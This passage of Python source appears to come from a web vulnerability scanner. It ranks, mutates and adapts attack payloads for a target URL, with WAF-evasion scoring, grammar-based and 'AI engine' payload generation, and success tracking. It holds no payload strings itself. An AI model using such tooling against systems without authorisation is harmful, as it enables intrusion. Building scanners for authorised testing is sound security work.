        # 2. Use DynamicPayloadEngine if available and enabled
        if use_dynamic_engine and self.dynamic_engine and include_generated:
            try:
                # Prepare context for DynamicPayloadEngine
                dynamic_context = {
                    'waf_detected': context.waf_detected is not None,
                    'injection_point': context.injection_context,
                    'max_length': context.max_payload_length,
                    'target_technology': fingerprint.product if fingerprint else None
                }
                
                # Generate dynamic payloads
                dynamic_variants = self.dynamic_engine.generate_payload_variants(
                    vuln_type=vulnerability_type,
                    count=top_n // 2,  # Generate half of requested payloads
                    context=dynamic_context
                )
                
                # Convert to our format
                for variant in dynamic_variants:
                    all_payloads.append({
                        'payload': variant.get('payload', ''),
                        'category': vulnerability_type,
                        'name': f"dynamic_{variant.get('hash', '')[:8]}",
                        'confidence': variant.get('confidence', 0.7),
                        'source': 'dynamic',
                        'technique': variant.get('technique', 'dynamic_generation')
                    })
                
                self.generation_stats[vulnerability_type]['generated'] += len(dynamic_variants)
                
            except Exception as e:
                logger.warning(f"DynamicPayloadEngine error: {e}")
        
        # 3. Generate with enhanced generator
        if include_generated:
            enhanced_payloads = self.enhanced_generator.generate(
                vulnerability_type, context, count=top_n // 3
            )
            all_payloads.extend(enhanced_payloads)
        
        # 4. Adapt, score, and rank all payloads
        ranked_payloads = []
        
        for payload_dict in all_payloads:
            # Adapt payload to context
            adapted = self.adapter.adapt_payload(
                payload_dict['payload'],
                context,
                fingerprint
            )
            
            # Score payload
            score = self.scorer.score_payload(payload_dict, fingerprint or self._default_fingerprint(), context)
            
            # Generate reasoning
            reasoning = self._generate_reasoning(payload_dict, score, fingerprint, context)
            
            # Create ranked payload
            ranked = RankedPayload(
                payload=adapted,
                metadata=payload_dict.get('metadata'),
                score=score,
                rank=0,
                reasoning=reasoning,
                category=payload_dict.get('category', vulnerability_type),
                name=payload_dict.get('name', 'unnamed'),
                source=payload_dict.get('source', 'static'),
                evasion_techniques=[payload_dict.get('technique')] if payload_dict.get('technique') else []
            )
            
            ranked_payloads.append(ranked)
        
        # 5. Sort by score and assign ranks
        ranked_payloads.sort(key=lambda x: x.score.total, reverse=True)
        
        for i, rp in enumerate(ranked_payloads[:top_n]):
            rp.rank = i + 1
        
        # Log statistics
        sources = defaultdict(int)
        for rp in ranked_payloads[:top_n]:
            sources[rp.source] += 1
        
        logger.debug(f"Payload sources for {vulnerability_type}: {dict(sources)}")
        
        return ranked_payloads[:top_n]
    
    def mutate_payload(self, payload: str, context: PayloadContext, 
                       techniques: List[str] = None) -> List[RankedPayload]:
        """
        Generate mutations of a specific payload
        
        Args:
            payload: Base payload to mutate
            context: Context for mutation
            techniques: Specific techniques to apply
            
        Returns:
            List of mutated payloads
        """
        mutations = []
        
        if techniques:
            # Apply specific techniques
            for technique in techniques:
                if technique in self.enhanced_generator.mutation_operators:
                    operator = self.enhanced_generator.mutation_operators[technique]
                    mutated = operator(payload, context)
                    
                    if mutated != payload:
                        ranked = RankedPayload(
                            payload=mutated,
                            source='mutated',
                            mutation_history=[technique],
                            score=PayloadScore(mutation_score=0.6),
                            reasoning=[f"Applied {technique} mutation"]
                        )
                        mutations.append(ranked)
        else:
            # Apply all mutations
            mutated_list = self.enhanced_generator._apply_mutations(payload, context)
            
            for mutation in mutated_list:
                ranked = RankedPayload(
                    payload=mutation['payload'],
                    source='mutated',
                    mutation_history=[mutation['technique']],
                    score=PayloadScore(mutation_score=0.5),
                    reasoning=[f"Applied {mutation['technique']} mutation"]
                )
                mutations.append(ranked)
        
        return mutations
    
    def generate_grammar_payloads(self, vuln_type: str, count: int = 10) -> List[RankedPayload]:
        """
        Generate payloads using grammar-based approach
        
        Args:
            vuln_type: Vulnerability type
            count: Number of payloads to generate
            
        Returns:
            List of grammar-generated payloads
        """
        grammar_payloads = self.enhanced_generator.grammar_generator.generate_from_grammar(
            vuln_type.lower(), count=count
        )
        
        ranked = []
        for i, payload in enumerate(grammar_payloads):
            rp = RankedPayload(
                payload=payload,
                source='grammar',
                score=PayloadScore(dynamic_score=0.7),
                rank=i + 1,
                reasoning=['Generated using context-free grammar'],
                category=vuln_type,
                name=f'grammar_{vuln_type}_{i}'
            )
            ranked.append(rp)
        
        return ranked
    
    def adapt_payload_to_context(self, payload: str, target_url: str,
                                 context: Optional[PayloadContext] = None,
                                 fingerprint: Optional[TargetFingerprint] = None) -> str:
        """Adapt a single payload to context"""
        if not context:
            context = PayloadContext(target_url=target_url)
        
        return self.adapter.adapt_payload(payload, context, fingerprint)
    
    def update_payload_success(self, payload_name: str, success: bool, technique: str = None):
        """Update success history for a payload"""
        self.scorer.update_history(payload_name, success, technique)
        
        # Update generation statistics
        if 'dynamic_' in payload_name:
            vuln_type = payload_name.split('_')[1] if '_' in payload_name else 'unknown'
            if success:
                self.generation_stats[vuln_type]['successful'] += 1
    
    def _generate_reasoning(self, payload_dict: Dict, score: PayloadScore,
                           fingerprint: Optional[TargetFingerprint],
                           context: Optional[PayloadContext]) -> List[str]:
        """Enhanced reasoning generation"""
        reasons = []
        
        # Source-based reasoning
        if payload_dict.get('source') == 'dynamic':
            reasons.append("Dynamically generated using AI engine")
        elif payload_dict.get('source') == 'grammar':
            reasons.append("Generated using context-free grammar")
        elif payload_dict.get('source') == 'mutated':
            technique = payload_dict.get('technique', 'unknown')
            reasons.append(f"Mutated using {technique}")
        elif payload_dict.get('source') == 'evasion':
            reasons.append(f"WAF evasion variant for {context.waf_detected if context else 'unknown'}")
        
        # Score-based reasoning
        if score.version_match >= 0.8:
            if 'product' in payload_dict:
                reasons.append(f"Matches target product: {payload_dict['product']}")
        
        if score.confidence_base >= 0.8:
            reasons.append(f"High confidence ({score.confidence_base:.0%})")
        
        if score.historical_success >= 0.7:
            reasons.append(f"Historical success rate: {score.historical_success:.0%}")
        
        if score.evasion_score >= 0.7:
            reasons.append("Optimized for WAF evasion")
        
        # Context-based reasoning
        if context:
            if context.waf_detected:
                reasons.append(f"Adapted for {context.waf_detected} WAF")
            if context.database_type:
                reasons.append(f"Optimized for {context.database_type}")
        
        if not reasons:
            reasons.append("General purpose payload")
        
        return reasons
    
    def _default_fingerprint(self) -> TargetFingerprint:
        """Create a default fingerprint when none provided"""
        return TargetFingerprint(
            url='',
            product='unknown',
            version='unknown',
            technologies=[],
            frameworks=[],
            headers={}
        )
    
    def export_report(self, ranked_payloads: List[RankedPayload]) -> Dict:
        """Export detailed payload selection report"""
        source_stats = defaultdict(int)
        technique_stats = defaultdict(int)
        
        for rp in ranked_payloads:
            source_stats[rp.source] += 1
            for technique in rp.evasion_techniques:
                technique_stats[technique] += 1
        
        return {
            'timestamp': datetime.now().isoformat(),
            'total_payloads': len(ranked_payloads),
            'source_distribution': dict(source_stats),
            'technique_distribution': dict(technique_stats),
            'generation_stats': dict(self.generation_stats),
            'payloads': [
                {
                    'rank': rp.rank,
                    'name': rp.name,
                    'category': rp.category,
                    'source': rp.source,
                    'payload': rp.payload[:100] + '...' if len(rp.payload) > 100 else rp.payload,
                    'score': {
                        'total': rp.score.total,
                        'confidence': rp.score.confidence_base,
                        'version_match': rp.score.version_match,
                        'dynamic': rp.score.dynamic_score,
                        'mutation': rp.score.mutation_score,
                        'evasion': rp.score.evasion_score
                    },
                    'reasoning': rp.reasoning,
                    'mutations': rp.mutation_history,
                    'evasion_techniques': rp.evasion_techniques
                }
                for rp in ranked_payloads
            ]
        }

# ============================================================================
# BACKWARD COMPATIBILITY CLASSES
# ============================================================================

class PayloadManager(UnifiedPayloadManager):
    """Alias for backward compatibility"""
    pass

class EnhancedPayloadManager(UnifiedPayloadManager):
    """Alias for backward compatibility"""
    pass

class PayloadGenerator:
    """Simplified generator for backward compatibility"""
    def __init__(self):
        self.enhanced = EnhancedPayloadGenerator()
    
    def generate(self, vuln_type: str, target_info: Dict = None) -> List[Dict]:
        context = PayloadContext(
            target_url=target_info.get('url', '') if target_info else '',
            technology_stack=target_info.get('technologies', []) if target_info else []
        )
        return self.enhanced.generate(vuln_type, context)

class SmartPayloadSelector:
    """Simplified interface for backward compatibility"""
    
    def __init__(self, kb_path: Optional[str] = None):
        self.manager = UnifiedPayloadManager(kb_path)
    
    def select_for_target(self, target: str, vulnerability: str,
                         aggressive: bool = False, context: Optional[Dict] = None) -> List[Dict]:
        """Select payloads (backward compatible interface)"""
        payload_context = None
        if context:
            payload_context = PayloadContext(
                target_url=target,
                waf_detected=context.get('waf'),
                parameter_name=context.get('param')
            )
        
        ranked = self.manager.get_payloads_for_target(
            target_url=target,
            vulnerability_type=vulnerability,
            context=payload_context,
            top_n=10
        )
        
        return [
            {
                'payload': rp.payload,
                'name': rp.name,
                'rank': rp.rank,
                'score': rp.score.total,
                'reasoning': rp.reasoning,
                'confidence': rp.score.confidence_base,
                'source': rp.source
            }
            for rp in ranked
        ]
    
    def update_results(self, payload_name: str, success: bool):
        """Update results (backward compatible)"""
        self.manager.update_payload_success(payload_name, success)
